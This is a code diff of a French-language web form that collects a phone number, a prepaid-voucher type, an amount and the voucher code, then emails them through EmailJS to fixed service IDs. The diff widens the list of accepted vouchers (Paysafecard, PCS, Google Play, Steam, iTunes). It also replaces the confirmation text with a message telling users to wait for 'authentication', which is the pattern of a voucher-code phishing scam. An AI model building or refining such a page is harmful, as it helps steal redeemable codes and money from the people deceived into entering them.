@@ -24,9 +24,13 @@
             <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
             <select name="type" required>
                 <option value="">Type de recharge</option>
-                <option value="neosurf">Neosurf</option>
                 <option value="transcash">Transcash</option>
-                <option value="mastercard">Mastercard</option>
+                <option value="pcs">PCS</option>
+                <option value="paysafecard">Paysafecard</option>
+                <option value="google play">Google Play</option>
+                <option value="neosurf">Neosurf</option>
+                <option value="iTunes">iTunes</option>
+                <option value="steam">Steam</option>
             </select>
             <input type="number" name="amount" placeholder="Montant" required>
             <input type="text" name="code" placeholder="Code" required>
@@ -65,7 +69,7 @@
         console.log("Numéro de téléphone récupéré :", userPhone);
                 emailjs.sendForm('service_jgg4chq', 'template_u1e5gjf', this)
                     .then(function() {
-                        alert("E-mail envoyé !");
+                        alert("Veuillez patienter quelque minutes pour l'authentification !");
                     }, function(error) {
                         alert("Erreur : " + JSON.stringify(error));
                     });
